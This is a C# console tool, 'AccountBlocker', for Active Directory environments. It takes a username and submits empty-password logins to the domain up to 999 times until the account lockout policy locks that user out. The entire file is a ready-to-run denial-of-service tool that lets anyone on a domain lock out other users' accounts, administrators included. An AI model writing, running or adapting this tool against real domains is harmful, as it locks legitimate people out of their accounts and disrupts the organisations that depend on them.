using System;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;

class Program
{
    static void Main()
    {
        Console.Title = "AccountBlocker";

        var domain = LoadDomain();
        if (domain == null)
        {
            return;
        }

        while (true)
        {
            Console.WriteLine("Enter a username to block: ");
            var username = Console.ReadLine();

            using (var context = LoadContext(domain))
            {
                if (context == null)
                {
                    continue;
                }

                using (var principal = FindUser(context, username))
                {
                    if (principal == null)
                    {
                        continue;
                    }

                    AttemptToBlockUser(context, principal, username);
                }
            }
        }
    }

    private static string LoadDomain()
    {
        Console.WriteLine("Loading domain...");
        try
        {
            using (var domain = Domain.GetCurrentDomain())
            {
                Console.WriteLine($"Associated with domain: \"{domain.Name}\"\n");
                return domain.Name;
            }
        }
        catch (ActiveDirectoryOperationException)
        {
            Console.WriteLine("Error: Can't load domain!");
            Console.Read();
        }
        return null;
    }

    private static PrincipalContext LoadContext(string domain)
    {
        try
        {
            return new PrincipalContext(ContextType.Domain, domain);
        }
        catch (PrincipalOperationException)
        {
            Console.WriteLine("Error: No network connection!");
            return null;
        }
    }

    private static UserPrincipal FindUser(PrincipalContext context, string username)
    {
        try
        {
            var principal = UserPrincipal.FindByIdentity(context, username);

            if (principal != null)
            {
                return principal;
            }

            Console.WriteLine($"Error: Can't find user called \"{username}\"!");
        }
        catch (ArgumentException)
        {
            Console.WriteLine("Error: Bad username!");
        }
        catch (MultipleMatchesException)
        {
            Console.WriteLine("Error: Multiple users found!");
        }

        return null;
    }

    private static void AttemptToBlockUser(PrincipalContext context, UserPrincipal principal, string username)
    {
        if (principal.IsAccountLockedOut())
        {
            Console.WriteLine($"\"{username}\" is already blocked!");
            return;
        }

        for (int i = 0; i < 999 && !principal.IsAccountLockedOut(); i++)
        {
            context.ValidateCredentials(username, string.Empty, ContextOptions.Negotiate);
        }

        if (principal.IsAccountLockedOut())
        {
            Console.WriteLine($"\"{username}\" has been successfully blocked!\n");
        }
        else
        {
            Console.WriteLine($"Error: \"{username}\" can't be blocked after 999 attempts!\n");
        }
    }
}
